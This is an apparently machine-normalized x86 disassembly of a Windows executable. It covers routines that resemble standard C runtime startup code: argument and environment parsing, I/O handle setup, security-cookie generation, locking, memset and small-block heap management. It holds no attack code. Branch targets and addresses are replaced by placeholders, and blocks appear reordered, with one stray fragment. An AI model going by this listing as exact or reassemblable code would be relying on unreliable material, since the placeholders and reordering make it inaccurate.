cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_40debd
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_40cf35
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_4109f3
test eax eax
pop ecx
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_40df1a
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
cmp esi ebx
jne r-xdata
call sub_40cf35
mov al [ esi ]
cmp al bl
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_40c248
mov edi eax
cmp edi ebx
pop ecx
pop ecx
mov [ rw-data ] edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_40dab0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebp
jmp r-xdata
cmp [ esi ] bl
jne r-xdata
push esi
call sub_40dab0
mov ebp eax
inc ebp
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_40ba40
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
add esi ebp
push 0x1
push ebp
call sub_40c248
cmp eax ebx
pop ecx
pop ecx
mov [ edi ] eax
je r-xdata
push [ rw-data ]
call sub_40ba40
mov [ rw-data ] ebx
or eax 0xffffffff
jmp r-xdata
push esi
push ebp
push eax
call sub_40d92c
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebp
add edi 0x4
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40f4c3
add esp 0x14
sub_40dff5
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
cmp [ ebp + 0x8 ] eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_4109f3
test eax eax
pop ecx
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test bl bl
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
test eax eax
pop esi
pop ebx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
test edx edx
movsx eax al
push eax
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_4109f3
test eax eax
pop ecx
je r-xdata
call sub_4109f3
test eax eax
pop ecx
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_40e18d
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] esi
je r-xdata
call sub_40cf35
mov [ ebp - 0x4 ] esi
cmp [ eax ] bl
mov [ ebp - 0x4 ] eax
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_40dff5
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_40c208
mov esi eax
cmp esi ebx
pop ecx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_40dff5
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40e246
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov edi [ GetEnvironmentStringsW@IAT ]
xor ebx ebx
xor esi esi
cmp eax ebx
push 0x2
pop ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
call edi
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebp
je r-xdata
cmp esi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call edi
mov esi eax
cmp esi ebx
jne r-xdata
mov eax [ rw-data ]
mov eax ebp
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov edi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax esi
push ebx
sar eax 0x1
inc eax
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
sub eax esi
inc eax
mov ebp eax
push ebp
call sub_40c208
mov edi eax
cmp edi ebx
pop ecx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_40c208
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
push ebp
push esi
push edi
call sub_40b1d0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40ba40
pop ecx
mov [ esp + 0x10 ] ebx
sub_40e37b
push 0x54
push r--data
call sub_40c69c
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_40c248
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_40c248
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_40c6e1
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_40fc53
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_40fc53
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_40e5cf
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_40e5f3
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_40e617
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
call sub_40c427
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_40c45e
test eax eax
pop ecx
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40f4c3
add esp 0x14
cmp [ ebp - 0x4 ] 0x2
pop esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40f4c3
add esp 0x14
push 0x3
pop eax
leave
retn
cmp [ ebp - 0x8 ] 0x5
jb r-xdata
xor eax eax
inc eax
leave
retn
sub_40e672
xor eax eax
cmp [ esp + 0x4 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
call sub_40e617
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
push 0x3f8
call sub_40e9ba
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
jmp r-xdata
sub_40e6cc
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
cmp eax edi
mov ebx 0xffff0000
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_40e760
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_40fc53
test eax eax
pop ecx
pop ecx
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40e7a9
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_40ba40
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_40e813
push 0xc
push r--data
call sub_40c69c
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_40dd26
push 0x1e
call sub_40db86
push 0xff
call sub_40c3c8
push 0x18
call sub_40c208
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_40e8d6
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_40d694
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_40c6e1
retn
push edi
call sub_40ba40
pop ecx
push 0xfa0
push edi
call sub_40fc53
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_40ba40
pop ecx
call sub_40d694
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e8cd
mov eax [ ebp - 0x1c ]
sub_40e8d6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40e813
test eax eax
pop ecx
jne r-xdata
push 0x11
call sub_40c37e
pop ecx
sub_40e911
push [ rw-data ]
call sub_40bd2f
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
xor eax eax
inc eax
retn
sub_40e940
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_410a5d
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40e9ba
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
inc eax
retn
retn
sub_40ea02
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
retn
add eax 0x14
sub_40ea2d
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp edx 0x20
mov ebx 0x80000000
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
cmp edx esi
mov [ ebp - 0x4 ] ecx
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp edx 0x20
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
mov esi 0x80000000
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_40ab70
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_40ed41
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_40edf1
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
mov [ ebp - 0x4 ] edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
